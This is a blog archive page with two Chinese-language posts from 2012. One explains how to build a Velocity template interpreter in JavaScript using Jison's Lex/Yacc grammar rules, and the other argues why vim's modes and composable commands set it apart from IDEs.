<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="alternative" href="/atom.xml" title="shepherdwind" type="application/atom+xml"><link rel="icon" href="/favicon.png"><title>电脑网络 - shepherdwind</title><link rel="stylesheet" href="/css/main.css" type="text/css"><!--[if lt IE 9]><script>(function(a,b){a="abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video".split(" ");for(b=a.length-1;b>=0;b--)document.createElement(a[b])})()</script><![endif]--></head></html><body><header class="site-head"><h1 class="site-title u-fl"><a href="/">shepherdwind</a></h1><nav class="site-nav u-fr"><ul class="site-nav__list"><li class="site-nav__item"><a href="/" class="site-nav__link">Home</a></li><li class="site-nav__item"><a href="/archives" class="site-nav__link">Archives</a></li></ul></nav></header></body><main class="site-main"><article class="post"><header class="post__head"><time datetime="2012-11-29T03:10:52.000Z" class="post__time">November 29, 2012</time><h1 class="post__title"><a href="/2012/11/29/how-to-realize-a-compiler/">How to realize velocity template interpreters </a></h1></header><div class="post__main"><h2 id="-">前言</h2>
<p>承玉曾经写过一篇文章<a href="http://ued.taobao.com/blog/2012/10/11/kissy-dsl-xtemplate/" target="_blank">构建前端DSL</a>，文中提到：</p>
<blockquote>
<p>从本质上看模板也是一个微型语言，因此可以从 DSL 的角度着手，使用工具快速构建一个适合于特定前端框架的模板引擎。</p>
</blockquote>
<p>本文讨论的话题和承玉的差不多，相信大家都知道coffeescript，handlerbars。承玉的DSL和handlerbars类似，我完成了一个<a href="http://git.shepherdwind.com/velocity.js/" title="velocity" target="_blank">模板语言velocity</a>的解析，更接近coffeescript的编译。在此，与大家分享一些经验，如果你也希望知道coffeescript语法解析如何完成的，那么，这片文章应该对你有所帮助。</p>
<p>让我们回顾一下2010年D2的时候，Hedger介绍了Closure Compiler，老赵的jscex，他们有一个共同点，都是对js进行编译，让js运行更快或者提供一起额外的功能。编译这么一个似乎和JavaScript没有关系的话题，却逐渐被越来越多的人提起。</p>
<p>本文主要介绍如何用js写一个编译器，这看起来似乎很高级，实际上，编译原理很复杂，写一个编译器却不怎么难，在做这个模板编译之前，我个人对于编译原理完全不知道的，因为看到coffeescript语法是Jison生成的，然后尝试了一下。写一个编译器，其实就是把一些语法规则翻译成计算机能够理解的结构，计算机所能理解语法规则有专门的描述语言，Yacc + Lex。IBM上有<a href="http://www.ibm.com/developerworks/cn/linux/sdk/lex/index.html" target="_blank">文章</a>如此描述：</p>
<blockquote>
<p>Lex 和 Yacc 是 UNIX 两个非常重要的、功能强大的工具。事实上，如果你熟练掌握Lex 和 Yacc 的话，它们的强大功能使创建 FORTRAN 和 C 的编译器如同儿戏。</p>
</blockquote>
<p>Yacc + Lex的一个实现是<a href="http://dinosaur.compilertools.net/#bison" target="_blank">Bison</a>，09年Zach Carter为了研究编译原理课程，用js完成了Bison的实现<a href="http://jison.org" target="_blank">Jison</a>, 承玉的<a href="https://github.com/kissyteam/kissy/tree/master/src/kison" target="_blank">kison</a>类似。故事就讲到这里，什么是Yacc，Lex，Bison，Jison，Kison，都不重要，重要的是，这些技术使得我们可以使用简单的方式完成复杂的字符串解析(比如编译)任务。现在我们要来实现一个编译器了，看完就知道这一切了。</p>
<p>在此声明，对于编译的理解仅限于个人理解，如有不对之处，欢迎指正。</p>
<h2 id="lex-amp-yacc">Lex &amp; Yacc</h2>
<p>Lex和Yacc主要用于解决编译中的第一个问题，源文件从字符串变得有意义(结构化数据)。这个过程，又分为两个步骤：</p>
<ol>
<li>源文件拆分成各种标志(tokens) Lex</li>
<li>构造数据结构 Yacc</li>
</ol>
<p>学习英语的时候，我们都会遇到语法问题，对于陌生的语言，需要知道其语法规则，计算机语法规则与自然语言类似，只是自然语言是与上下文有关的语言，比起计算机语言复杂得多。与上下文无关，其实就是语言的符号意义是确定的。扯远了，举个例子，一个正常的英语句子:</p>
<figure class="highlight"><pre>What you <span class="property">name</span>?
</pre></figure>

<p>回到英文课堂，老师会说，句子是由主语+谓语+宾语构成，这个句子构成的元素是，主语you，谓语what，宾语name，谓语动词前置构成疑问句，疑问句结束用问好。这样的一个语法规则，让计算机理解，需要依据上面的两个步骤：</p>
<ol>
<li>识别单词，也就是英语中的主语、谓语和宾语，好吧这些背单词的时候记住就行。标点符号也是词法元素。</li>
<li><p>语法识别，上面的句子对应的语法是：谓语 + 主语 + 宾语 + 问号 =&gt; 疑问句</p>
<p>词法识别和英语学习中背单词一样，计算机通过正则在字符串中匹配词，构成语言的基本结构，这些结构按照一定组合规则构成语法。Yacc所做的，是把扫描一串字符串，识别其中的词，把词和所描述的语法一一对照，然后能够得到一些结构化的数据，比如上面英语，计算机就能够知道，这是一个疑问句，疑问句的三个成分是what、you、name，至于这个句子什么意思，你应该如何处理，这是编译过程的第二步了。</p>
</li>
</ol>
<h2 id="velocity-syntax">velocity syntax</h2>
<p>上面简单描述了一下原理，现在开始写语法规则分析器吧。写编译器就是把一套语法规则描述清楚，就像翻译一篇说明书。当然，我们首先需要能明白说明书的意义，本文以velocity模板语言为例，velocity是Java实现的一套模板，是阿里集体后端webx框架的模板语言，语法规则<a href="http://velocity.apache.org/engine/devel/user-guide.html" target="_blank">文档</a>，可以大致看下语法，或者点击<a href="http://git.shepherdwind.com/velocity.js/try/index.html" target="_blank">此处</a>在线尝试vm解释过程。</p>
<p>vm(velocity简称)语法规则很简单，大概开5分钟就能学会，vm虽然简单，但是也是一套比较基本的计算机语言的实现了，对比下，英语我们学习了10年，还没能学好，vm只需要5分钟，自然语言的复杂度，比起计算机语言实在不是一个数量级。</p>
<figure class="highlight"><pre><span class="symbol">#set</span>( <span class="char">$f</span>oo = <span class="comment">"Velocity"</span> )
<span class="class">Hello</span> <span class="char">$f</span>oo <span class="class">World</span>!
</pre></figure>

<p>vm语法分为两部分，第一部分是vm语法内容，另一部分是字符串，模板语言都是如此，字符串部分无需考虑，原样输出即可，vm语法主要是前者结构分析。上面的vm输出<code>Hello Velocity World!</code>。语法部分，主要分为两部分References和Directives。</p>
<h3 id="references-literal">References 和 Literal</h3>
<p>References是vm中变量，解析时References输出为变量对应的值，模板语言最基本的功能也就是变量替换，vm同样如此，只是vm还有一些其他复杂的功能。Literal和js里面的字面量一直，是vm里面的基本数据结构。vm是一个模板语言，变量的值可以来自外部，而且是主要数据来源，References和Literal这两者构成了vm语法的基本数据。</p>
<p>References基本形式是<code>$foo</code>，或者加一些修饰符<code>$!{foo}</code>。复杂形式是，变量+属性，支持的属性方式有三种：</p>
<ul>
<li>Properties 最普通的属性<code>$foo.bar</code></li>
<li>Methods 方法<code>$foo.bar()</code>，因为方法是有参数的，参数由References和Literal构成</li>
<li>Index 索引<code>$foo[&#39;bar&#39;]</code>，index可以是字符串，也可以是变量References</li>
</ul>
<p>上面三种方式和js的对象属性查找方式一样，因为存在Methods和Index，方法和Index本身又可以包含References，引用的组成部分可以是引用。这样式描述形成了递归，语法一般都是通过递归的形式来相互包含。引用(References)里包含自身，这如果使用普通的字符串匹配，逻辑上会有些晕。</p>
<p>Literal是基本的数据结构，分为字符串、map(js中的对象)、数字、数组。map的值由Literal 或者References构成，数组元素同样，字符串和数组相对简单，可以直接从源文件中匹配得到。到此，应该大致明白编译的复杂了吧，就这些基本的数据结构相互包含，要理清其中结构，还是很麻烦的吧，虽然我们可以一眼就知道这些结构，如何让计算机明白，就不那么容易了。不过，通过yacc，我们只需要描述清楚这些结构就行，怎么理清其中关系，Jison会自动处理的。</p>
<h3 id="directives">Directives</h3>
<p>前面引用和字面量部分，是vm中关系最复杂的结构了，Directives是一些指令，包括逻辑结构和循环，模块之间引用加载等运算。这些结构比较好搞定，一般都是各自不相干，不像上面，相互引用，纠缠不清。vm解析，最复杂的还是在于引用的确定。</p>
<p>Directives分为单行指令和多行指令，单行指令作用范围是一句，比如<code>#set</code>、<code>#parse</code>，多行指令主要是<code>#macro</code>,<code>#foreach</code>,<code>if|else|elseif</code>，这些都是通过<code>#end</code>来结束，这样的区分可以在语法分析阶段完成，也可以在后期处理。</p>
<h2 id="-">语法分析</h2>
<p>本文有些长，已经开始靠近目标了。上面描述语法的过程，是非常重要的，使用yacc描述语法规则，就是对输入源分类的过程。经过上面的分析，yacc的已经差不多构思好了，接下来把规则用yacc语法写下来就好。</p>
<p>在写yacc描述之前，需要做一件是，lex词法分析。词法分析就是要找到上面说的References、Literal、Directives的基本元素。新建一个文件<code>velocity.l</code>，开始写lex描述。</p>
<h3 id="references">References</h3>
<p>从References开始，vm里面引用的最主要的特征是符号<code>$</code>，首先假设有一个vm字符串：</p>
<figure class="highlight"><pre>hello <span class="variable">$foo</span> world
</pre></figure>

<p>其中，<code>$foo</code>是References，很明显References是美元符号开头，<code>$</code>后面跟字母，这里需要引入状态码的概念，因为<code>$</code>后面的字母的意义和<code>$</code>前面的字母意义是不一样的，那么当扫描到<code>$</code>以后，可说我们处于不同的状态，区分好状态，就可以专心处理之和vm语法，否则同样的一个字符，意义就不一样。这个状态，我们用<code>mu</code>表示，状态吗可以随意命名，使用<code>mu</code>，是有渊源的，handlerbars的lex文件因为继承了Mustache语法，<code>mu</code>表示Mustache语法开始，我参考了handlerbars，所以用<code>mu</code>。</p>
<p>velocity.l写下：</p>
<figure class="highlight"><pre><span class="variable">%x</span> mu

<span class="variable">%%</span>
[^#]<span class="variable">*?</span>/<span class="string">"$"</span>         { this.begin(<span class="string">"mu"</span>); <span class="keyword">if</span>(yytext) <span class="keyword">return</span> <span class="string">'CONTENT'</span>; }
&lt;mu&gt;<span class="string">"$!"</span>           { <span class="keyword">return</span> <span class="string">'DOLLAR'</span>; }
&lt;mu&gt;<span class="string">"$"</span>            { <span class="keyword">return</span> <span class="string">'DOLLAR'</span>; }
&lt;INITIAL&gt;&lt;&lt;EOF&gt;&gt;   { <span class="keyword">return</span> <span class="string">'EOF'</span>; }
</pre></figure>

<p>%x声明有的状态码，状态码和字符串或者正则表达式组合成一个特征，比如<code>&amp;lt;mu&amp;gt;&quot;$&quot;</code>，双引号表示字符串，这个特征描述表示，mu状态下，遇到$，返回DOLLAR。我们用DOLLAR描述$，至于为什么我们要给<code>$</code>一个名字，再次回到英语中，我们会把单词分为名词、动词，各种分类，语法规则不会直接处理某个特定的词如何组合，而是规定某一类词的组合规则，比如，最普通的句子，主语+谓语+宾语，主语一般是名词，谓语是动词，宾语也是名词，这样描述要简单得多，lex词法分析是给字符做最小粒度的分类，最终，一个vm输入源码，可以归纳到一个分类里，符合英语语法的字符串，我们统称为英语。</p>
<p>特征都使用全大写字母，这是一种约定，因为在yacc描述中，语法规则名都用小写。<code>%%</code>后面第一行，<code>[^#]*?/&quot;$&quot;</code>，这是一个正则表达式，正则分为两个部分，第一部分 <code>[^#]*?</code>匹配所有不是符号#的字符，后面一部分<code>&quot;$&quot;</code>，中间反斜杠分割，是一个向后断言，匹配美元符号前面所有不是符号#的字符，也就是遇到没有符号的时候，后面通过 <code>this.begin</code>开始状态<code>mu</code>。这里使用到yytext，就是前面正则所匹配到的内容，有个细节，这个匹配去除了<code>#</code>，因为<code>#</code>是另一种状态Directives的开始，这里暂时只讨论引用识别。最后一行，表示结束返回，这个无需理解。</p>
<p>引用的最基本形式，$ + 字母，美元符号识别了，接下来识别后面的字母，使用正则表达式</p>
<figure class="highlight"><pre> &lt;mu&gt;[<span class="link_label">a-zA-Z</span>][<span class="link_reference">a-zA-Z0-9_</span>]*   { return 'ID'; }
</pre></figure>

<p>如此，我们可以用这两条规则，开始写第一条yacc语法规则了：</p>
<figure class="highlight"><pre><span class="tag">reference</span>
   : <span class="tag">DOLLAR</span> <span class="tag">ID</span>
       <span class="rules">{ <span class="rule">$$ = {<span class="attribute">type</span>:<span class="value"> <span class="string">"references"</span>, id: $<span class="number">2</span></span></span></span>} }
   ;
</pre></figure>

<p>上面描述的是reference，由lex中返回的DOLLAR和ID组合成为一个reference，大括号里面写的是js代码，用于构造结构化数据，需要什么样的数据可以自己随便搞，<code>$$</code>表示返回结果， <code>$1</code>是DOLLAR词对应的字符串，也就是<code>$</code>，<code>$2</code>表示第二个词，也就是ID。复杂的reference可以继续写：</p>
<figure class="highlight"><pre><span class="keyword">reference</span>
  : DOLLAR ID
  | DOLLAR ID attributes 
  ;

attributes
  : attribute 
  | attributes attribute 
  ;

attribute
  : <span class="function"><span class="keyword">method</span> 
  | <span class="title">index</span> 
  | <span class="title">property</span> 
  ;</span>

<span class="keyword">property</span>
  : DOT ID 
  ;

<span class="keyword">index</span>
  : BRACKET literal CLOSE_BRACKET 
  | BRACKET <span class="keyword">reference</span> CLOSE_BRACKET 
  ;
</pre></figure>

<p>reference在原来的基础下，增加了attributes，attributes是由一个或者多个属性组成，在yacc中，使用<code>attributes attribute</code>来描述多个属性的情况，规则直接包含自身的情况还是非常常见的。attribute由 <code>method,index,property</code> 组成，继续拆分，<code>index</code>是两个中括号加一个<code>literal</code>或者 <code>reference</code> 组成，我们可以继续对literal进行分类，同样的描述。我们回到了上面对vm 语法描述的那个分类过程只不过，现在我们使用yacc的语法描述，前面使用的是自然语言。</p>
<h2 id="-">解析过程</h2>
<p>上面讲了那么多，现在来总结一下Jison解析一个字符串的过程。用一张图表示吧:</p>
<p><img src="http://img04.taobaocdn.com/tps/i4/T1ozQhXk0fXXXcTDYQ-678-1415.png" alt="lext"></p>
<p>词汇分析过程就是上面所描述的了，一个lex文件，构成一个词汇表，通过从左到右的扫描输入源，依次匹配词汇表里面定义的模式，然后构成一个个词汇。得到词汇之后，那什么是语法呢，还记得英语语法吗？在计算机里面，语法就是上面所描述的，词汇的组合，规定了词汇的组合形式，比如<code>DOLLAR ID</code>组成一个<code>reference</code>，写yacc语法规则就是不断的对语法进行分类，直到所有的分类最底层都是lex中的词汇，然后语法规则也就ok了。程序会自动根据yacc文件所有定义的规则，分析得到输入源对应的数据结构。</p>
<p>velocity最终的语法描述在<a href="https://github.com/shepherdwind/velocity.js/tree/master/src/parse" target="_blank">这里</a>。</p>
<h3 id="-">状态码</h3>
<p>上面简要描述了yacc和lex工作原理过程，实际中，还是会遇到一些有意思的问题。在写vm解析器的时候，最麻烦的事情是，如何保证括号和中括号的匹配，首先看一段vm字符串：</p>
<figure class="highlight"><pre><span class="variable">$foo</span>.bar(<span class="variable">$foo</span>.name(<span class="string">"foo"</span>)[<span class="number">1</span>])
<span class="variable">$foo</span>.bar([)]
</pre></figure>

<p>经过分析，我发现括号匹配的一个特点是，括号的闭合状态下，它的前一个状态肯定是括号开始，中括号同样如此。因此，我在velocity.l中再引入两种状态，<code>i, c</code>，分别表示括号开始和中括号开始，在匹配到括号或者中括号结束的时候，判断前面的一个状态是否是符号的开始，这样，就能保证括号和中括号的配对。</p>
<p>在lex词汇分析中，状态码是一个堆栈，这个堆栈通过<code>this.begin</code>开始一个状态，<code>this.popStat</code>退出一个状态，词汇可以是多种状态和正则表达式进行组合，状态的开始和结束，需要自己控制，否则可能会有问题。</p>
<p>解析最终得到一个对象，这个对象的构造是根据velocity.yy而生成的。如何选择合适的数据结构，这个是很很重要的，后面的语法树解释过程，完全取决于解析器所返回的语法树。在velocity的语法树，最终得到的是一个一维数组，数组的元素分为字符串和对象两种，如果是对象，那么是vm语法需要进行分析解释的。</p>
<h2 id="-">语法树解释</h2>
<p>得到输入源语法结构之后的工作，相对而言就容易了，这其中会涉及到两个点，我个人觉得比较有意思的。第一个是局部变量，在vm语法中，有一个指令<code>#macro</code>，这个是vm的函数定义，由函数，自然有形参和实参，在函数执行过程中，形参是局部变量，只在函数解析过程中有效，<code>#foreach</code>也会形成一个局部变量，在foreach中有一个内部变量<code>$foreach.index</code>, <code>$foreach.count</code>, <code>$foreach.hasNext</code>这样的局部变量。</p>
<p>局部变量的实现，可以参考lex语法分析过程，在语法树解释过程中，增加一个状态码，当进入一个foreach或者macro的时候，生成一个全局唯一的条件id，并且在状态中压入当前的条件id，当foreach和macro运行结束后，推出一个状态。foreach和macro控制状态，同时构造一个数据空间，贮存临时变量，在vm解析过程中，所有的变量查找和设置，都是通过同样的一个函数。当一个变量查询时，检测到存在状态时，首先依次根据状态码，找到对应状态下的局部变量，如果需要查询的变量在局部环境中找到，那么返回局部对象对应的值，如果是这是值，同样如此。这样的实现和js所中的函数执行上下文有点类似，可以继续想象一下如何实现避包，实现避包其实只需要在一个函数中返回一个函数，这样的语法在vm中没有，不过如果真的可以返回一个函数，那么只需要在这个函数和当前函数执行所对应的状态放在一起，并且不释放状态对象的局部变量，那么避包也就有了。</p>
<h2 id="-">结束</h2>
<p>本文到此要结束了，不知道是否有说明白，具体实现细节可以参考velocity.js<a href="https://github.com/shepherdwind/velocity.js" target="_blank">源码</a>。</p>
</div><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a href="/tags/前端/" class="post__tag__link">前端</a></li><li class="post__tag__item"><a href="/tags/算法/" class="post__tag__link">算法</a></li><li class="post__tag__item"><a href="/tags/经验分享/" class="post__tag__link">经验分享</a></li></ul><a href="/2012/11/29/how-to-realize-a-compiler/#disqus_thread" class="post__foot-link u-fr">0 COMMENTS</a></footer></article><article class="post"><header class="post__head"><time datetime="2012-11-04T15:00:21.000Z" class="post__time">November 4, 2012</time><h1 class="post__title"><a href="/2012/11/04/how-vim-so-good/">vim如何成为神器</a></h1></header><div class="post__main"><p>这个问题，让我思考了很久，vim的特色之处到底是什么，最开始使用vim是因为学长的建议，同时vim有着编辑器之神的传说。玉伯指出，vim比起IDE，有些落伍了。这让我很震撼，大家从来都是在讨论vim和emacs之争，很自然的，vim党或者emacs用户，都没有把IDE放在讨论的范畴之类。我等也不过，远远的看着这些所谓的争论，毕竟，我只是一个vim用户而已，那些论战是牛人们的事情，vim有多好，他们自然可以证明，或者说，这无需证明，vim很优秀，这是公论了。</p>
<p>为此，很荣幸有机会看到玉伯分享IDE的相关操作，确实，IDE有着很多优秀的特性，是vim 所无法做到的。关于此问题的讨论，也没有一个vim用户站出来，像玉伯一样，用一个比较有力的观点说明vim的特色之处。神器毕竟只是一个传说，那么，vim为何成为神器呢？带着这个问题，我翻了很多资料，所获甚少，关于神器的传说，似乎没有出处。</p>
<p>于是，开始重新仔细阅读vim自带的文档，从vim官网上查看一些信息。可以确定的是vim从来没有自称神器，在一篇vim 20周年的文章中可以看到，vim官网所提出的，为何人们还在使用vim的几个理由：多文件操作(Buffer和分屏)、有模式的、多个寄存器、宏、高度可配置扩展、跨平台。这些，所有的现代编辑器，IDE都(除了多模式)能做到，而且做的都还不错。</p>
<p>似乎，vim不过一个普通的编辑器而已，但是，作为一个忠实的vim用户，我感觉，这个普通的编辑器，有着自己无可比拟的特殊之处，我觉得，我应该找到这些特殊的，让无数程序员着迷的特性是什么。我个人使用vim不过3年，3年时间，对于一个vim用户来说，一点都不长，甚至是刚入门一会儿，我知道我个人的理解可能不那么准确，但是我还是总结了几点，我个人觉得是vim特色之处，是IDE所不可比拟，是那些IDE的所谓的vim模式所做不到的。</p>
<p>我认为vim和IDE最大区别在于，vim是有模式的，vim是unix一部分，秉承这unix哲学——一切都是文本，vim中的命令是原子性的，可以随意组合。下面一一解释，vim的特色之处很多，不过也有一些是IDE所擅长的，比如自动提醒之类的，IDE可以内置一个语言引擎，这样提示确实要强大的多。</p>
<h3 id="-">模式</h3>
<p>vim的模式，是的vim可以有多种编辑状态，最常用的是普通模式，输入模式，视图模式，命令模式，普通状态是vim的默认模式，所有键盘的按键都是你可以使用的快捷键，这时候，你在用的似乎不是在编辑文本了，更确切的说是，处理文本，键盘不再是输入字符，而是 vim的各种命令。这样，使得vim非常快速做各种改动。写代码过程中，其实我们花更多的时间在调试，修改代码，而不是输入代码，写代码。所以，我们需要vim的正常模式，进入vim 首先进入的是正常模式。</p>
<p>有人表示，vim的模式看起来非常诡异，让人无法理解，模式切换复杂。其实，古老的vi使用esc进入正常模式，现代的vim已经提供很多其他更方便的方式模式切换 <code>&lt;C-o&gt;, &lt;C-[&gt;, &lt;C-c&gt;</code>(C表示Ctrl键)，vim基本只需要使用大键盘就ok了，因为有模式，可以随意绑定各种快捷键。各种现代的编辑器或者IDE，都有自己的选择模式和命令模式，不过在vim里面，正常模式是特有的，在正常模式下，vim的命令大致分为两种，操作和文本对象，文本对象是的vim里面所有文本区块是各种符合程序员思维的区块，vim提供了丰富的文本对象，w一个单词，p一个段落，s一句话，[]表示一个中括号块，类似的还有 ( ) { }  &lt; &gt; &quot; &#39;，t一个html tag组合，这样的区块在程序代码中经常出现，更多请看<code>:help text-object</code>。确定了区块，然后可以执行各种操作了，比如删除，修改边界符合，在一个区块里进行替换，或者移动某个区块单位。</p>
<p>正常模式下，使用最多的是光标的移动了。在代码中找到目标代码，有文本区块的概念，就非常容易，比如，我们想在一个{}两端跳转，输入{就可以了，va{就可以选中一个{}包围的区块。也许有人会说，使用鼠标移动要比键盘移动快， vim的h j k l只是一种移动方式，单步移动是最基础的移动方式，vim里面更快速的是使用区块移动，一个单词，一个大括号包围的区块，等等。vim不仅仅可以移动光标，还能移动视窗位置<code>zz zt zb</code>，把光标所在位置设置为视窗中心，或者顶部、底部，这样的功能还是非常实用的。鼠标移动的最大问题是，鼠标是不准确的，如果我们确切知道自己要如何移动，键盘的方式更快速。对于鼠标比较适用模糊定位，vim 也能做到，在光标附近，我们明确想要去某个位置，而不是某个区块的情况下，vim使用 <a href="https://github.com/Lokaltog/vim-easymotion" target="_blank">easymotion</a>插件可以快速而准确定位。具体实现是，把光标位置后面的每个单词的第一个字母标记为a-z 26个字母，然后输入你想要去的单词前面的那个字母，也可以定位到单词所在位置了。你需要做的是两个步骤，高亮单词首字母，选择你要去的位置字母。这和鼠标的速度，至少不相上下，而且更加准确。</p>
<p>说的有点抽象，举个例子吧：</p>
<figure class="highlight"><pre>hello world. We <span class="keyword">use</span> vim <span class="keyword">for</span> the ohly editor.
</pre></figure>

<p>如果光标恰好在world的d上面，现在要去修改oely，把e改为n，vim可以使用<code>2fhrn</code>，这样完成修改，这样或许显得有些繁琐，还得首先调用f进行查找，鼠标可以直接定位修改，那么vim的快速模式，执行的命令是<code>,,w</code>此时，启动easymotion，文本变成了：</p>
<figure class="highlight"><pre>hello aorld. be cse <span class="keyword">dim</span> eor fhe ghly hditor.
</pre></figure>

<p>对比前面可以看到，所有单词的第一个字母都有了编号(hellow world变成了hellow aorld，a就是编号，a会高亮，其他都为灰色)，可以很快定位目标单词的位置，然后输入g，跳转到ohly(ohly变成了ghly，g是编号)的o上，输入l右移一个单位，rn，修改h为n，ok完成。这里提到的只是一个基本功能，easymotion可以做更多快速定位操作的。上面这种模式，在vim的选择模式下同样有效：</p>
<figure class="highlight"><pre>hello world. We <span class="keyword">use</span> vim <span class="keyword">for</span> the only editor.
hello world. We <span class="keyword">use</span> vim <span class="keyword">for</span> the only editor.
hello world. We <span class="keyword">use</span> vim <span class="keyword">for</span> the only editor.
</pre></figure>

<p>上面的代码，如果选中了第一行的hello world，下面我要继续选择第三行的editor，这个时候，vim的easymotion，vim的文本区块选择还是依然有效的，如果是用鼠标，鼠标的选择和键盘是互斥的，你只能老老实实拖拽到第三行吧。这里，其实也是后面要说的，vim一致性体验的一个方面，在各种模式下，所有的操作都是通用的。</p>
<h3 id="-">一致性</h3>
<p>一切都是文本，这样其实意味着，在vim里面高度的编码一致性体验。一致性体验，这个只有在vim和emacs里面可以做到的。这意味着，在vim中，你的所有操作，都是vim风格的，处理正常的文本处理，我们有时候需要调用终端，或者文件操作，文件查找等等。在vim里面操作一个文件也是一个文本，这样，修改文件夹和修改文件名一样了。IDE里面总是有着各种窗口，这些窗口彼此是独立的。vim只有一个窗口，在这个窗口里面所有操作都是一致的。</p>
<p>一致性在上面也提到过，easymotion的移动，在选择模式和正常模式下一致的。在比如，vim 的帮助文档，统一的入口是:help命令，文档是vim的一部分，文档的浏览也是通过 vim的键盘命令导航的。而大多数IDE的帮助文档，都是一个独立的系统。比如在emacs里面，对一个文件夹的操作，和操作一个文本是一致的，这在vim同样可以做到。emacs自带eshell ，终端可以跑在emacs里面，这时候，终端就是emacs的一个buffer，同样在vim也可以做到类似的功能。IDE 可以自带一个shell，不过，ide的shell更像是一个shell的窗口放在ide里面，而vim里面， shell就是vim处理的一个文本，它在vim里面，和普通的文本处理没有本质的差异。或许vim 只能处理文本，所以所有操作都以文本的形式存在，所有操作可以使用同样的键盘命令移动方式使用，nerdtree的文件节点同样是一个buffer，一堆文本。而IDE 里面，文件结构树是IDE一个与编辑窗口不一样的一个窗口对象，IDE的其他窗口里面，编辑模式下的快捷键移动等，都不再有效。</p>
<h3 id="-">命令组合</h3>
<p>很多人说，vim里面能够做到的快捷键，IDE都能做到。我觉得，vim里面的操作，很多时候不应该称之为快捷键，应该说是命令，编辑器命令。使用vim操作文本，其实就是在调用编辑器命令。这和IDE所谓的快捷键是完全不同的概念，IDE把命令封装成一系列快捷键，但是这些命令本身对使用者是不可见的，而vim里面，所有按键都是一个最小单位命令：一个操作，一个文本对象区块，或者一种模式，使用vim就是在不停的调用各种命令。比如，daw，在 vim里面表示delete a word，d a w是三个彼此独立的命令，d表示的是执行操作删除，<code>aw</code> 是作用范围，可以看做是函数传递的参数。你可以用d后面接受各种文本区块的组合， <code>aw:a word</code> ， <code>ap:a paragraph</code> 等等，同样，<code>aw</code>前面也可以接受其他任意各种命令，比如v<code>vaw</code>选中，y<code>yaw</code>复制。这是其他任何IDE所做不到的，IDE 里面的快捷键就是一个功能，快捷键是不能拆分成单独命令。命令可以拆分，你可以在各种模式下使用这些最小命令单位。在 vim里面，选择一部分文件修改，和修改整个文件是没有任何区别的。</p>
<p>命令最小化的优势在于，你能做任意你想做的事情，这些命令的各种组合，记住一个命令，它能够在多种情况下使用，看似命令繁琐，其实命令所作用的方式在vim里面是一致的。y表示复制，对文件的复制用的也是y命令。</p>
<p>举个例子，vim插件surround，操作文本：&quot;hello&quot;, ds&quot; =&gt; hello，cs&quot;&#39; =&gt; &#39;hello&#39; 。这里使用两个命令<code>ds&quot;</code>和<code>cs&quot;&#39;</code>，乍一看似乎很诡异的语法，其实了解了vim的命令原子特征，就可以很轻松理解这两个命令了，<code>ds&quot;</code>表示<code>delete surround &quot;</code>，双引号在vim表示双引号围起来的区块，d是vim中删除的基本命令，<code>dw</code>删除一个单词，<code>dap</code>删除一个段落。<code>cs&quot;&#39;</code>这个命令表示，<code>change surround &quot; &#39;</code>，c是change的基本命令，这个命令也就很好理解了吧。在 IDE里面，相同的操作大概是一个快捷键，记住那么一个快捷键，你能删除一个&quot;，可能你还得记住另外一个快捷键删除一对括号，一对大括号，一对各种其他符号，这些在vim里面，不用看文档都知道怎么做了吧<code>ds( ds{ ...</code>。更重要的是，这些原子命令，在任何地方都是有效的。每个vim命令都是一个小功能，组成一个强大的文本编辑器，就像 unix由各种小部件构成一样，这是任何IDE所无法做到的。</p>
<h3 id="-">其他</h3>
<p>这里讲一个小故事，最近前端模板比较流行使用编译的方式来写语法解析，一般的一套模板语法就是一个和上下文无关的语法规则，比如handlebarsjs，coffeejs。承玉为kissy增加新的xtemplate，同样使用的是Bison的js实现来生成语法规则，Bison语法由yacc和lex两者组成，前者是语法规则，后者是语法中词法规则，语法由词法构成。至于什么是yacc和lex，这里不讨论，咱说的是编辑器。承玉实现了Bison的js版本，kison，同样的js实现还有Jison， handlebarsjs和coffeejs都是用Jison生成解析器的。kison和Jison都接受json文件作为词法和语法规则描述文件，不同的是Jison还支持标准的yacc和lex文件格式，而kissy的xtemplate 语法描述文件是<a href="https://github.com/kissyteam/kissy/blob/master/src/xtemplate/sub-modules/compiler/src/parser-grammar.kison" target="_blank">json</a>的。这是问题的关键，实际上，yacc文件描述要比json容易理解得多。handlebarsjs的语法描述是yacc形式的，coffeejs的语法描述原来也是yacc格式的，不过，后来，改成了coffeejs写的了，coffeejs为了保证coffee源码整体都是coffeejs写的，所以使用了coffeejs形式。但 xtemplate为何会使用json，实际上，yacc转换为json应该不复杂的。而yacc文件描述语言，几乎是语法文档的标准，比如<a href="http://ecma-international.org/ecma-262/5.1/#sec-15.12.1.2" target="_blank">ecma 5.1</a>文档对JSON的描述：</p>
<figure class="highlight"><pre>JSONText :
  JSONValue

JSONValue :
  JSONNullLiteral
  JSONBooleanLiteral
  JSONObject
  JSONArray
  JSONString
  JSONNumber

JSONObject :
  <span class="list">{ }</span>
  <span class="list">{ JSONMemberList }</span>

JSONMember :
  JSONString : JSONValue

JSONMemberList :
  JSONMember
  JSONMemberList , JSONMember

JSONArray :
  [ ]
  [ JSONElementList ]

JSONElementList :
  JSONValue
  JSONElementList , JSONValue
</pre></figure>

<p>这样的描述，不用解释，就都大致可以看明白吧，如果写出json，一方面可读性不好，另一方面，语法有错误也不好定位，没有语法高亮。饶了这么久，终于到正题上了，为啥kissy没有使用yacc而是json，我个人猜测，原因大概是，承玉是开发工具是IntelliJ IDEA，.yy文件根本无法识别，市场上也没有这么一个插件支持yacc语法，这么古老的东西，大概不会有现代编辑器支持了吧。subline text2同样，.yy文件也只能当成是plain text处理。而我也恰好写了一个 velocity的模板解析器，用vim打开.yy的文件，毫无压力，语法高亮，错误提示全部都有。我相信，没有程序员愿意对着一个黑白的编辑器写代码吧。</p>
